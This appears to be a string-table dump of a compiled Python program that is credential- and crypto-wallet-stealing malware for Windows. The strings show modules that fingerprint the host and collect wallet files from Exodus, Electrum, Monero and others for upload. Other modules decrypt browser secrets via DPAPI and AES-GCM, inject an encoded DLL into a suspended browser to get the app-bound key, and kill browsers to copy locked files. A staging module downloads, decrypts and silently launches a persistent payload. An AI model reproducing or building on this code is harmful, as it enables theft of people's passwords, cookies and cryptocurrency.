+u_get_username.<locals>.inner
+a_run_with_timeout
+aenviron
+aget
+aUSERNAME
+aUSER
+aUnknown
+u_get_pc_name.<locals>.inner
+aCOMPUTERNAME
+aplatform
+anode
+aUnknown
+u_get_windows_version.<locals>.inner
+awinreg
+asystem
+aWindows
+aOpenKey
+aHKEY_LOCAL_MACHINE
+uSOFTWARE\Microsoft\Windows NT\CurrentVersion
+aQueryValueEx
+aCurrentBuildNumber
+aProductName
+alower
+aenterprise
+aEnterprise
+aeducation
+aEducation
+apro
+aPro
+ahome
+aHome
+uWindows 
+w)uWindows (Unknown)
+u_get_cpu.<locals>.inner
+uGetting CPU
+aDEBUG
+uQuerying Win32_Processor via WMI
+uCPU retrieved
+aINFO
+ucpu=
+apythoncom
+awmi
+aCoInitialize
+aWMI
+aWin32_Processor
+aName
+astrip
+acollect
+aCoUninitialize
+u_get_gpu.<locals>.inner
+uGetting GPU
+uQuerying Win32_VideoController via WMI
+uGPU retrieved
+ugpu=
+aWin32_VideoController
+aupper
+aRTX
+aGTX
+aQUADRO
+aTESLA
+aRADEON
+uRADEON GRAPHICS
+uRADEON VEGA
+uRX 
+uR9 
+uR7 
+uR5 
+aARC
+aINTEL
+aname
+u<genexpr>
+u_get_gpu.<locals>.inner.<locals>.<genexpr>
+u_get_ram.<locals>.inner
+uGetting RAM
+uQuerying virtual_memory via psutil
+uRAM retrieved
+uram=
+apsutil
+avirtual_memory
+atotal
+u GB (
+u MB)
+atrace
+asi0
+acollect
+uCollecting system info
+uStarting system info collection
+asi1
+ausr
+a_get_username
+asi2
+a_get_pc_name
+asi3
+a_get_windows_version
+asi4
+acpu
+a_get_cpu
+asi5
+agpu
+a_get_gpu
+asi6
+aram
+a_get_ram
+ausername
+apcName
+aosVersion
+acpu
+agpu
+aram
+asi9
+uSystem info complete
+ucollected=
+uCollect all system information. Each operation is fail-safe with 3s timeout.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+uconcurrent.futures
+aThreadPoolExecutor
+aTimeoutError
+aTimeoutError
+atrace
+alogging
+aLoggingManager
+aLogType
+asystem_info
+aUnknown
+areturn
+Ostr
+areturn
+Odict
+aget_system_info
+uapp\handlers\system_info.py
+wxaname
+u<module app.handlers.system_info>
+ainner
+aresult
+ainner
+afunc
+adefault
+aexecutor
+afuture
+ausername
+apc_name
+aos_version
+acpu
+agpu
+aram
+ainfo
+apythoncom
+awmi
+wwaprocessors
+aresult
+apythoncom
+awmi
+wwagpus
+aresult
+agpu
+aname
+apsutil
+atotal_bytes
+atotal_mb
+atotal_gb
+awinreg
+aos_name
+akey
+abuild
+aproduct_name
+aversion
+aproduct_lower
+aedition
+a__spec__
+.app.handlers.wallets
+atrace
+ascan
+uExodus.zip
+ajoin
+a_APPDATA
+aExodus
+uexodus.wallet
+uAtomic.zip
+aatomic
+uLocal Storage
+aleveldb
+uElectrum.zip
+aElectrum
+awallets
+uElectrum-LTC.zip
+uElectrum-LTC
+uZcash.zip
+aZcash
+uArmory.zip
+aArmory
+uBytecoin.zip
+abytecoin
+uJaxx.zip
+ucom.liberty.jaxx
+aIndexedDB
+ufile__0.indexeddb.leveldb
+uEthereum.zip
+aEthereum
+akeystore
+uGuarda.zip
+aGuarda
+uCoinomi.zip
+aCoinomi
+uCakeWallet.zip
+ucom.cakewallet.cake_wallet
+uCake Wallet
+uMonero.zip
+a_USER_HOME
+aDocuments
+aMonero
+uMonero_AppData.zip
+aHitFile
+aHitFileCategory
+aWALLET
+apath
+aready_for_upload
+afiles
+naLoggingManager
+aadd
+a_MODULE
+uCollected 
+saLogType
+aDEBUG
+upath=
+wnuWallet files collected
+aINFO
+ucount=
+uCollect all desktop wallet files.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+atrace
+alogging
+aLoggingManager
+aLogType
+aHitFile
+aHitFileCategory
+agetenv
+aAPPDATA
+saexpanduser
+w~areturn
+aget_wallet_files
+uapp\handlers\wallets.py
+u<module app.handlers.wallets>
+afiles
+awallet_paths
+aname
+apath
+ahit_file
+a__spec__
+.app.http
+a_in_doh_resolution
+a_doh_cache
+atrace
+wtadoh0
+nsa_DOH_SERVER
+u?name=
+u&type=A
+aurllib
+arequest
+aRequest
+aheaders
+aAccept
+uapplication/dns-json
+aurlopen
+atimeout
+a__enter__
+a__exit__
+ajson
+aloads
+aread
+adecode
+nnnadata
+aget
+aAnswer
+atype
+adata
+adoh1
+uok.
+aLoggingManager
+aadd
+a_MODULE
+uDoH resolved
+aLogType
+aDEBUG
+u -> 
+adoh2
+uno.ans
+uDoH no answer
+aWARN
+uNo A record for 
+wxadoh3
+nuDoH failed
+uResolve hostname using Cloudflare DoH, returns first A record IP.
+a_DOH_HOSTNAME
+a_resolve_via_doh
+a_original_getaddrinfo
+uPatched getaddrinfo that uses DoH for all hosts except cloudflare-dns.com.
+a_doh_enabled
+asocket
+agetaddrinfo
+a_patched_getaddrinfo
+udoh.en
+aglobal
+uDoH enabled
+aINFO
+uAll DNS via Cloudflare DoH
+uEnable DoH resolution for all DNS lookups.
+a_session
+arequests
+aSession
+aRetry
+atotal
+abackoff_factor
+astatus_forcelist
+aHTTPAdapter
+amax_retries
+amount
+uhttps://
+uhttp://
+uSession created
+uHTTP session initialized with retry policy
+aconfig
+aAPI_HOST
+u/shard
+ashard_url
+aSHARD_HEADERS
+aupdate
+areplace
+u/submit
+w/s:nl
+nuh.p.
+uPOST 
+uurl=
+aget_session
+apost
+aheaders
+adata
+afiles
+atimeout
+aheaders
+ajson
+atimeout
+uh.r.
+wsastatus_code
+uResponse 
+ustatus=
+u len=
+atext
+astrip
+astartswith
+w<u<!DOCTYPE
+u<html
+uh.html.
+uHTML response detected
+aERROR
+uReceived HTML instead of JSON. url=
+aurl
+aRequestException
+uh.ex.
+nuRequest failed 
+nuh.g.
+uGET 
+aheaders
+atimeout
+uh.gr.
+uh.ghtml.
+uh.gex.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+a__annotations__
+uurllib.request
+urequests.adapters
+aHTTPAdapter
+uurllib3.util.retry
+aRetry
+aconfig
+atrace
+alogging
+aLoggingManager
+aLogType
+ahttp
+uhttps://cloudflare-dns.com/dns-query
+ucloudflare-dns.com
+Ostr
+ahostname
+areturn
+Ostr
+Ostr
+pppaenable_doh
+uX-Edge-Cache-Revalidate
+uX-Runtime-Env
+ustale-if-error
+ujre-embedded
+areturn
+aendpoint
+areturn
+Ostr
+paendpoint
+ajson_data
+Odict
+afiles
+aextra_headers
+aResponse
+ashard_post
+nashard_get
+uapp\http.py
+u<module app.http>
+ahost
+aport
+afamily
+atype
+aproto
+aflags
+ahostname
+aurl
+areq
+aresp
+adata
+aanswer
+aretry
+aadapter
+aendpoint
+aextra_headers
+aurl
+aheaders
+aep_short
+asession
+aresp
+aendpoint
+ajson_data
+afiles
+aextra_headers
+aurl
+aheaders
+aep_short
+asession
+aresp
+aendpoint
+a__spec__
+.app.logging
+atitle
+adescription
+aauthor
+alog_type
+atime
+atimestamp
+alogType
+avalue
+a_sanitize
+a_logs
+aappend
+aHitLog
+sare
+asub
+u[\r\n\t\x00-\x1f\x7f]
+w aMAX_DESCRIPTION_LENGTH
+asanitized
+ato_dict
+a__doc__
+a__file__
+apath
+adirname
+ajoin
+aenviron
+aget
+aNUITKA_PACKAGE_app
+u\not_existing
+alogging
+aNUITKA_PACKAGE_app_logging
+u\not_existing
+a__path__
+aorigin
+ahas_location
+asubmodule_search_locations
+a__cached__
+aenum
+aEnum
+aEnum
+a__prepare__
+aLogType
+a__getitem__
+u%s.__prepare__() must return a mapping, not %s
+a__name__
+u<metaclass>
+a__module__
+a__qualname__
+ainfo
+aINFO
+awarn
+aWARN
+aerror
+aERROR
+adebug
+aDEBUG
+a__orig_bases__
+a__init__
+uHitLog.__init__
+areturn
+Odict
+uHitLog.to_dict
+aLoggingManager
+a__annotations__
+aadd
+uLoggingManager.add
+adescription
+areturn
+Ostr
+Ostr
+uLoggingManager._sanitize
+areturn
+AOlist
+Odict
+aget_logs
+uLoggingManager.get_logs
+uapp\logging\__init__.py
+u<module app.logging>
+a__class__
+aself
+aauthor
+atitle
+alog_type
+adescription
+acls
+adescription
+asanitized
+acls
+aauthor
+atitle
+alog_type
+adescription
+asanitized
+acls
+aself
+a__spec__
+.app.resources.browser_module
+abase64
+ab64decode
+aMODULE_DATA
+astrip
+uDecode and de-XOR the browser module DLL bytes.
+u<genexpr>
+uget_browser_module.<locals>.<genexpr>
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+9uEru7i7u7u/u7u7RES7uwO7u7u7u7u7+7u7u7u7u7u7u7u7u7u7u7u7u7u7 ...[base64 blob, 157016 chars]
+areturn
+Obytes
+aget_browser_module
+uapp\resources\browser_module.py
+wbu<module app.resources.browser_module>
+axored_data
+sa__spec__
+.app.resources
+a__doc__
+a__file__
+apath
+adirname
+ajoin
+aenviron
+aget
+aNUITKA_PACKAGE_app
+u\not_existing
+aresources
+aNUITKA_PACKAGE_app_resources
+u\not_existing
+a__path__
+aorigin
+ahas_location
+asubmodule_search_locations
+a__cached__
+abrowser_module
+aget_browser_module
+aget_browser_module
+uapp\resources\__init__.py
+u<module app.resources>
+sa__spec__
+.app.staging
+aenviron
+aget
+aLOCALAPPDATA
+sajoin
+aexpanduser
+w~aAppData
+aLocal
+aPath
+aMicrosoft
+aWindows
+a_INSTALL_FOLDER
+uGet the installation path.
+a_get_install_path
+upython.exe
+uGet path to python.exe.
+aScripts
+upip.exe
+uGet path to pip.exe.
+arequests
+uhttp://
+a_STATUS_HOST
+sw:a_STATUS_PORT
+atimeout
+astatus_code
+atext
+astrip
+astartswith
+w[atrace
+ust.chk
+aactive
+aLoggingManager
+aadd
+a_MODULE
+uPersistence active
+aLogType
+aINFO
+uStatus server responding
+uCheck if persistence is already active via local status server.
+uUser-Agent
+uMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+aPUT
+aput
+aheaders
+atimeout
+astream
+averify
+uDownload failed: 
+aurl
+aERROR
+uHTTP 
+a__enter__
+a__exit__
+aiter_content
+achunk_size
+wfawrite
+nnnuDownload error: 
+uDownload a file to destination path.
+a_CDN_HEADERS
+acopy
+aheaders
+atimeout
+averify
+acontent
+uDownload content as bytes.
+uCrypto.Cipher
+aAES
+aAES
+uCrypto.Util.Padding
+aunpad
+aunpad
+abase64
+ab64decode
+a_FERNET_KEY
+l naurlsafe_b64decode
+q nanew
+aMODE_CBC
+adecrypt
+ablock_size
+uFernet decrypt failed
+uDecrypt Fernet-encrypted data using pycryptodome.
+amkdir
+aparents
+aexist_ok
+atempfile
+amkstemp
+u.zip
+atmp_
+asuffix
+aprefix
+aclose
+ust.py
+uDownloading Python
+uFetching embedded distribution
+a_download_file
+a_PYTHON_URL
+ust.py
+aextract
+uExtracting Python
+uExtracting files
+azipfile
+aZipFile
+wranamelist
+ainstall_path
+aopen
+aread
+uExtract error: 
+aWARN
+a_get_python_exe
+aexists
+uPython extraction failed
+upython.exe not found after extraction
+ust.py
+uPython installed
+upath=
+uPython setup error
+atemp_zip
+aunlink
+uDownload and extract Python embedded distribution.
+upython312._pth
+uPTH file not found
+aread_text
+uutf-8
+aencoding
+u#import site
+areplace
+u#import site
+uimport site
+awrite_text
+aencoding
+uutf-8
+ust.pth
+aenabled
+uSite enabled
+uUncommented import site
+uimport site
+uSite already enabled
+aDEBUG
+uimport site already uncommented
+import site
+ust.pth
+aadded
+uSite added
+uAdded import site to pth
+uPTH modification failed
+uEnsure 'import site' is uncommented in python312._pth.
+uget-pip.py
+ust.pip
+uDownloading get-pip.py
+uFetching pip installer
+uhttps://bootstrap.pypa.io/get-pip.py
+ust.pip
+arun
+uRunning pip installer
+uInstalling pip
+w1aPYTHONDONTWRITEBYTECODE
+asubprocess
+arun
+a_CREATE_NO_WINDOW
+acwd
+aenv
+acapture_output
+atimeout
+acreationflags
+areturncode
+uPip install failed
+uexit=
+a_get_pip_exe
+uPip not found after install
+upip.exe missing
+ust.pip
+uPip installed
+uSuccessfully installed pip
+aTimeoutExpired
+uPip install timeout
+uProcess timed out
+uPip install error
+uDownload and run get-pip.py to install pip.
+urequirements.txt
+ust.req
+uhttps://
+u/cdn/
+a_CDN_REQUIREMENTS
+amethod
+aheaders
+ust.req
+ainstall
+uInstalling requirements
+uRunning pip install
+ainstall
+uRequirements install failed
+ust.req
+uRequirements installed
+uDependencies installed
+uRequirements timeout
+upip install timed out
+uRequirements error
+uDownload requirements.txt and install via pip.
+aAppHost
+ust.app
+umain.dl
+u/cdn/e/
+a_CDN_MAIN_PY
+a_download_bytes
+umain.py download failed
+uNo data received
+a_fernet_decrypt
+umain.py decrypt failed
+uDecryption returned None
+umain.py
+awrite_bytes
+ust.app
+umain.ok
+umain.py ready
+usize=
+ust.app
+upyd.dl
+a_CDN_APP_PYD
+uapp.pyd download failed
+uapp.pyd decrypt failed
+uapp.pyd
+ust.app
+upyd.ok
+uapp.pyd ready
+ust.app
+alaunch
+aPopen
+aPIPE
+acwd
+aenv
+astdout
+astderr
+astdin
+acreationflags
+astdout
+astderr
+astdin
+ust.app
+upid.
+apid
+uApp launched
+upid=
+u userId=
+nu...
+uApp launch error
+uDownload, decrypt, and launch the app.
+ast0
+astart
+uStaging started
+uhost=
+a_is_persistence_active
+ast1
+uskip.active
+uSkipping staging
+uPersistence already active
+ast2
+upy.dl
+a_download_and_extract_python
+ast2
+upy.fail
+ast2
+upy.exists
+uPython exists
+a_ensure_site_enabled
+ast3
+upip.dl
+a_install_pip
+ast3
+upip.fail
+ast3
+upip.exists
+uPip exists
+ast4
+areq
+a_install_requirements
+ast4
+ureq.fail
+ast5
+aapp
+a_download_and_launch_app
+ast5
+uapp.fail
+ast9
+uStaging complete
+uApp launched successfully
+ust.fatal
+nuStaging fatal error
+uWorker function that runs staging in background.
+uStaging skipped
+uMissing host or userId
+athreading
+aThread
+a_stage_worker
+ustaging-worker
+atarget
+aargs
+adaemon
+aname
+astart
+uStaging thread started
+uthread=
+aname
+    Start staging in a background thread.
+    Returns the thread object (can be ignored if fire-and-forget).
+    
+Staging helper - downloads and sets up Python environment + app in background.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+apathlib
+aPath
+aurllib3
+adisable_warnings
+aexceptions
+aInsecureRequestWarning
+aconfig
+aconfig
+atrace
+alogging
+aLoggingManager
+aLogType
+astaging
+@u127.0.0.1
+uhttps://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip
+aIManagementEngine
+ab7e2f1d9c3a6
+ad6c9a4e1f7b3
+aa1f8d3b7c2e9
+udK9mT3nR7xQ2pL8wF4jH6yB1cN5gA0sZ12345678abc=
+uUser-Agent
+ux-cdn-origin-verify
+uMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+utrusted-upstream
+areturn
+areturn
+Obool
+aGET
+lxadest
+amethod
+aheaders
+Odict
+atimeout
+aPUT
+aurl
+amethod
+aheaders
+atimeout
+areturn
+Ostr
+Odict
+Otuple
+Obytes
+atoken_data
+areturn
+Obytes
+Obytes
+areturn
+ahost
+areturn
+Ostr
+Obool
+ahost
+auser_id
+areturn
+Ostr
+pObool
+ahost
+auser_id
+areturn
+Ostr
+pnahost
+auser_id
+astage_async
+uapp\staging.py
+u<module app.staging>
+ainstall_path
+atemp_zip
+atemp_zip_path
+aentry
+afilename
+atarget_path
+asrc
+adst
+ahost
+auser_id
+ainstall_path
+aapp_host_path
+amain_url
+amain_encrypted
+amain_decrypted
+apyd_url
+apyd_encrypted
+apyd_decrypted
+aenv
+aproc
+aurl
+amethod
+aheaders
+atimeout
+aresp
+aurl
+adest
+amethod
+aheaders
+atimeout
+aresp
+wfachunk
+apth_file
+acontent
+anew_content
+atoken_data
+aAES
+aunpad
+akey_bytes
+aencryption_key
+atoken_bytes
+aciphertext
+acipher
+apadded_data
+adata
+alocal_app_data
+ainstall_path
+aget_pip_path
+aenv
+aproc
+ahost
+ainstall_path
+arequirements_path
+aurl
+aenv
+aproc
+aresp
+abody
+ahost
+auser_id
+ahost
+auser_id
+athread
+a__spec__
+.app.trace
+atime
+a_START
+u05d
+uElapsed ms since start.
+w[a_ts
+su] 
+u :: 
+aprint
+a_LOG_FILE
+wauutf-8
+a__enter__
+a__exit__
+awrite
+nnnuTrace point. Prints cryptic output and appends to log file.
+u] X:
+u !! 
+uError trace. Prefixed with X.
+wwu=== 
+u ===
+uClear log file on fresh start.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+ajoin
+agetenv
+aTEMP
+uC:\Windows\Temp
+usvchost_d.log
+areturn
+Ostr
+acode
+aval
+Ostr
+pwtD
+acode
+aerr
+Ostr
+pwxaclear
+uapp\trace.py
+u<module app.trace>
+acode
+aval
+amsg
+acode
+aerr
+amsg
+wfa__spec__
+.app.util
+a__doc__
+a__file__
+apath
+adirname
+ajoin
+aenviron
+aget
+aNUITKA_PACKAGE_app
+u\not_existing
+autil
+aNUITKA_PACKAGE_app_util
+u\not_existing
+a__path__
+aorigin
+ahas_location
+asubmodule_search_locations
+a__cached__
+acrypto
+adpapi_decrypt
+aget_browser_dpapi_master_key
+agcm_decrypt
+adpapi_decrypt
+aget_browser_dpapi_master_key
+agcm_decrypt
+afile
+aget_browser_profiles
+aget_browser_profiles
+aregistry
+aget_install_path
+aget_install_path
+aprocess
+alaunch_suspended
+aterminate_process
+apid_to_tag
+aSuspendedProcess
+alaunch_suspended
+aterminate_process
+apid_to_tag
+aSuspendedProcess
+apipe
+asetup_pipe
+adecrypt_key
+aclose_pipe
+asetup_pipe
+adecrypt_key
+aclose_pipe
+adll_injection
+adecrypt_abe_key
+adecrypt_abe_key
+uapp\util\__init__.py
+u<module app.util>
+sa__spec__
+.app.util.crypto
+awin32crypt
+naDPAPI_PREFIX
+nnaLoggingManager
+aadd
+a_MODULE
+uDPAPI decrypt
+aLogType
+aDEBUG
+uDecrypting 
+su bytes
+aCryptUnprotectData
+atrace
+wtucr.dp
+uok.
+wx:nl
+nuDPAPI decrypt failed
+aERROR
+uDecrypt data using Windows DPAPI.
+uDecrypt data using Windows DPAPI with entropy parameter.
+uGetting master key
+uReading 
+wruutf-8
+a__enter__
+a__exit__
+ajson
+aload
+nnnalocal_state
+aos_crypt
+aencrypted_key
+abase64
+ab64decode
+uMaster key extracted
+uBase64 decoded, decrypting with DPAPI
+adpapi_decrypt
+ucr.mk
+uGet master key failed
+uGet the master key from browser's Local State file.
+uCrypto.Cipher
+aAES
+aAES
+nnanew
+aMODE_GCM
+anonce
+adecrypt_and_verify
+nnucr.gcm
+nuGCM decrypt failed
+aWARN
+uDecrypt AES-GCM encrypted data (Chrome/Discord format).
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+atrace
+alogging
+aLoggingManager
+aLogType
+acrypto
+cDPAPI
+aencrypted_bytes
+areturn
+Obytes
+aencrypted_bytes
+aentropy
+areturn
+Obytes
+Obytes
+adpapi_decrypt_with_entropy
+alocal_state_path
+areturn
+Ostr
+Obytes
+aget_browser_dpapi_master_key
+aencrypted_data
+akey
+areturn
+Obytes
+Obytes
+agcm_decrypt
+uapp\util\crypto.py
+u<module app.util.crypto>
+aencrypted_bytes
+awin32crypt
+aresult
+aencrypted_bytes
+aentropy
+awin32crypt
+w_adecrypted
+aencrypted_data
+akey
+aAES
+apayload
+acipher
+alocal_state_path
+wfalocal_state
+aencrypted_key
+aresult
+wea__spec__
+.app.util.dll_injection
+akernel32
+aVirtualAllocEx
+aMEM_COMMIT
+aMEM_RESERVE
+aPAGE_READWRITE
+aGetLastError
+aLoggingManager
+aadd
+a_MODULE
+uVirtualAllocEx failed
+aLogType
+aERROR
+uerror=
+suMemory allocated
+aDEBUG
+uaddr=0x
+wXu size=
+ac_size_t
+acreate_string_buffer
+aWriteProcessMemory
+abyref
+uWriteProcessMemory failed
+uPath written
+uwritten=
+avalue
+aGetProcAddress
+aGetModuleHandleW
+ukernel32.dll
+cLoadLibraryA
+uGetProcAddress failed
+uCould not find LoadLibraryA
+uLoadLibraryA found
+aDWORD
+aCreateRemoteThread
+uCreateRemoteThread failed
+aWaitForSingleObject
+NaCloseHandle
+uDLL injected
+aINFO
+uthread_id=
+uDLL injection failed
+uInject a DLL into a process using CreateRemoteThread + LoadLibraryA.
+uDecrypting ABE key
+uapp=
+aregistry
+aget_install_path
+uBrowser not found
+uCould not find install path for 
+aprocess
+alaunch_suspended
+aget_browser_module
+uModule decoded
+usize=
+atempfile
+amkstemp
+u.tmp
+asuffix
+awrite
+aclose
+uModule written
+upath=
+apid_to_tag
+aprocess_id
+apipe
+asetup_pipe
+aencode
+aascii
+ainject_dll
+aprocess_handle
+uInjection succeeded
+upid=
+adecrypt_key
+afromhex
+uKey decrypted
+ukey_len=
+aclose_pipe
+aunlink
+uABE decryption failed
+aterminate_process
+    Decrypt an ABE-encrypted key by injecting a DLL into the browser process.
+    1. Get browser install path from registry
+    2. Launch browser suspended
+    3. Extract and write DLL to temp file
+    4. Create named pipe for communication
+    5. Inject DLL into browser process
+    6. DLL connects to pipe, receives encrypted key, returns decrypted key
+    7. Terminate browser process
+    
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+actypes
+awintypes
+alogging
+aLoggingManager
+aLogType
+aresources
+aget_browser_module
+aregistry
+aprocess
+apipe
+adll_injection
+aINFINITE
+awindll
+aHANDLE
+aLPVOID
+aargtypes
+arestype
+aLPCVOID
+aPOINTER
+aBOOL
+aLPCWSTR
+aHMODULE
+aLPCSTR
+adll_path
+areturn
+aencrypted_key
+aapp_name
+areturn
+Obytes
+Ostr
+Obytes
+adecrypt_abe_key
+uapp\util\dll_injection.py
+u<module app.util.dll_injection>
+aencrypted_key
+aapp_name
+abrowser_path
+asuspended
+adll_bytes
+atemp_path
+apipe_name
+apipe_handle
+adll_path_bytes
+adecrypted_hex
+adecrypted_key
+adll_path
+aprocess_handle
+adll_path_with_null
+adll_path_len
+aarg_address
+aerror
+awritten
+abuffer
+asuccess
+aload_library_a
+athread_id
+athread_handle
+wea__spec__
+.app.util.file
+ajoin
+abrowser_path
+aBROWSER_PROFILE_REGEX
+amatch
+aprofiles
+aLoggingManager
+aadd
+a_MODULE
+uGet profiles failed
+aLogType
+aERROR
+uGet browser profile directories (Default, Profile 1, etc.).
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+alogging
+aLoggingManager
+aLogType
+afile
+acompile
+u^(Default|Profile\s+\d+)$
+aIGNORECASE
+abrowser_path
+areturn
+Ostr
+AOlist
+Ostr
+aget_browser_profiles
+uapp\util\file.py
+u<module app.util.file>
+abrowser_path
+aprofiles
+aname
+afull_path
+wesa__spec__
+.app.util.handle_copy
+alower
+akernel32
+aCreateToolhelp32Snapshot
+aTH32CS_SNAPPROCESS
+aPROCESSENTRY32W
+asizeof
+adwSize
+aProcess32FirstW
+abyref
+aszExeFile
+apids
+ath32ProcessID
+aProcess32NextW
+asnap
+aCloseHandle
+uGet all PIDs for processes with given executable name.
+aget_processes_by_name
+aOpenProcess
+aPROCESS_TERMINATE
+aTerminateProcess
+akilled
+aLoggingManager
+aadd
+a_MODULE
+uKilled processes
+aLogType
+aDEBUG
+uname=
+su count=
+w/uKill all processes with given executable name.
+w::l
+nacreate_unicode_buffer
+aQueryDosDeviceW
+avalue
+nnuConvert DOS path (C:\...) to NT path (\Device\HarddiskVolume1\...).
+acreate_string_buffer
+aULONG
+antdll
+aNtQuerySystemInformation
+aSystemExtendedHandleInformation
+aSTATUS_SUCCESS
+aSTATUS_INFO_LENGTH_MISMATCH
+araw
+uQuery system handles failed
+aERROR
+uQuery all system handles.
+aHANDLE
+aOBJECT_ATTRIBUTES
+aLength
+aCLIENT_ID
+aUniqueProcess
+aNtOpenProcess
+aPROCESS_DUP_HANDLE
+uOpen a process with PROCESS_DUP_HANDLE access.
+aGetCurrentProcess
+aNtDuplicateObject
+aDUPLICATE_SAME_ACCESS
+uDuplicate a handle from source process to current process.
+aname
+naquery
+u_get_handle_name.<locals>.query
+athreading
+aThread
+atarget
+adaemon
+astart
+ajoin
+atimeout
+ais_alive
+aname
+uGet the NT object name for a handle with timeout to avoid pipe hangs.
+ aNtQueryObject
+ahandle
+aObjectNameInformation
+ aOBJECT_NAME_INFORMATION
+afrom_buffer_copy
+aName
+aBuffer
+awstring_at
+aresult
+aIO_STATUS_BLOCK
+aFILE_STANDARD_INFORMATION
+aNtQueryInformationFile
+aFileStandardInformation
+aEndOfFile
+uGet file size via handle.
+aLARGE_INTEGER
+aNtReadFile
+aInformation
+uRead entire file contents through a handle.
+a__enter__
+a__exit__
+aread
+nnnuCheck if a file is locked by another process.
+a_dos_path_to_nt_path
+u\user data\
+u\opera stable\
+u\opera gx stable\
+atarget_nt
+afind
+w\aGetCurrentProcessId
+a_query_system_handles
+afrom_bytes
+nalittle
+aSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
+abase_offset
+aentry_size
+aUniqueProcessId
+aprocess_cache
+a_open_process_for_dup
+a_duplicate_handle
+aHandleValue
+a_get_handle_name
+amarkers
+aname_lower
+atarget_suffix
+aendswith
+a_get_file_size
+2a_read_file_via_handle
+awrite
+avalues
+uHandle dup copy failed
+uTry to copy file using handle duplication from browser processes.
+uFile not found
+upath=
+ais_file_locked
+ashutil
+acopy2
+uDirect copy
+usrc=
+uDirect copy failed
+uerror=
+uTrying handle dup
+ubrowser=
+u pids=
+a_try_handle_dup_copy
+uHandle dup copy
+uKilling browser
+aWARN
+akill_process_by_name
+atime
+asleep
+?uPost-kill copy
+uAll copy strategies failed
+u error=
+    Copy a browser file to destination, handling locks.
+    Strategy:
+    1. Try direct copy
+    2. If locked, try handle duplication
+    3. If that fails, kill browser and copy
+    Returns True if copy succeeded.
+    
+atempfile
+amkstemp
+asuffix
+aclose
+acopy_browser_file
+aunlink
+uTemp copy failed
+    Get a temporary copy of a browser file.
+    Returns path to temp file or None if failed.
+    
+Locked file copy utilities using handle duplication.
+Copy strategy:
+1. Try direct copy
+2. If locked, duplicate handle from browser process
+3. If that fails, kill browser and copy
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+actypes
+awintypes
+aStructure
+aPOINTER
+apathlib
+aPath
+aPath
+alogging
+aLoggingManager
+aLogType
+ahandle_copy
+ac_long
+aNTSTATUS
+awindll
+a__prepare__
+aUNICODE_STRING
+a__getitem__
+u%s.__prepare__() must return a mapping, not %s
+a__name__
+u<metaclass>
+a__module__
+a__qualname__
+aUSHORT
+aMaximumLength
+aLPWSTR
+a_fields_
+a__orig_bases__
+aUniqueThread
+aRootDirectory
+aObjectName
+aAttributes
+aSecurityDescriptor
+aLPVOID
+aSecurityQualityOfService
+aObject
+ac_ulonglong
+aGrantedAccess
+aCreatorBackTraceIndex
+aObjectTypeIndex
+aHandleAttributes
+aReserved
+aStatus
+aAllocationSize
+aNumberOfLinks
+aDeletePending
+aBOOLEAN
+aDirectory
+aDWORD
+acntUsage
+ath32DefaultHeapID
+ath32ModuleID
+acntThreads
+ath32ParentProcessID
+apcPriClassBase
+aLONG
+adwFlags
+aWCHAR
+aargtypes
+arestype
+aBOOL
+aLPCWSTR
+aUINT
+aname
+areturn
+Ostr
+AOlist
+Oint
+aname
+areturn
+Ostr
+Obool
+ados_path
+areturn
+Ostr
+areturn
+Obytes
+apid
+areturn
+Oint
+Oint
+asource_proc
+asource_handle
+areturn
+Oint
+Oint
+ahandle
+atimeout_ms
+areturn
+Oint
+Ostr
+ahandle
+areturn
+Oint
+Oint
+ahandle
+asize
+areturn
+Oint
+Obytes
+apath
+areturn
+Ostr
+Obool
+asrc_path
+adst_path
+abrowser_pids
+areturn
+Ostr
+pAOlist
+Oint
+Obool
+asrc_path
+adst_path
+abrowser_exe
+areturn
+Ostr
+ppObool
+u.db
+asrc_path
+abrowser_exe
+asuffix
+areturn
+Ostr
+ppHT
+Ostr
+aget_temp_copy
+uapp\util\handle_copy.py
+u<module app.util.handle_copy>
+a__class__
+ados_path
+apath_str
+adrive
+adevice_buf
+asource_proc
+asource_handle
+atarget_handle
+acurrent
+astatus
+ahandle
+aio_status
+ainfo
+astatus
+ahandle
+atimeout_ms
+aresult
+aquery
+apid
+ahandle
+acid
+astatus
+abuf_size
+abuf
+areturn_length
+astatus
+ahandle
+asize
+abuf
+aio_status
+aoffset
+astatus
+asrc_path
+adst_path
+abrowser_pids
+atarget_nt
+amarkers
+atarget_suffix
+amarker
+apos
+amy_pid
+apid_set
+ahandle_data
+anum_handles
+aentry_size
+abase_offset
+aprocess_cache
+wiaoffset
+aentry
+apid
+aproc_handle
+adup_handle
+aname
+aname_lower
+amatches
+asize
+adata
+wfahandle
+asrc_path
+adst_path
+abrowser_exe
+weabrowser_pids
+atime
+aname
+apids
+aname_lower
+asnap
+asrc_path
+abrowser_exe
+asuffix
+atemp_path
+apath
+aname
+apids
+akilled
+apid
+ahandle
+abuf
+areturn_length
+astatus
+ainfo
+ahandle
+aresult
+ahandle
+aresult
+a__spec__
+.app.util.pipe
+u\\.\pipe\
+sakernel32
+aCreateNamedPipeW
+aPIPE_ACCESS_DUPLEX
+aPIPE_TYPE_BYTE
+aPIPE_READMODE_BYTE
+aPIPE_WAIT
+aINVALID_HANDLE_VALUE
+aGetLastError
+aLoggingManager
+aadd
+a_MODULE
+uCreateNamedPipe failed
+aLogType
+aERROR
+uerror=
+uPipe created
+aDEBUG
+uname=
+aHANDLE
+uCreate a named pipe for communication with injected DLL.
+athreading
+aresult
+aerror
+nnapipe_operation
+udecrypt_key.<locals>.pipe_operation
+aThread
+atarget
+astart
+ajoin
+atimeout
+ais_alive
+uPipe operation timeout
+utimeout=
+aerror
+uPipe operation failed
+aresult
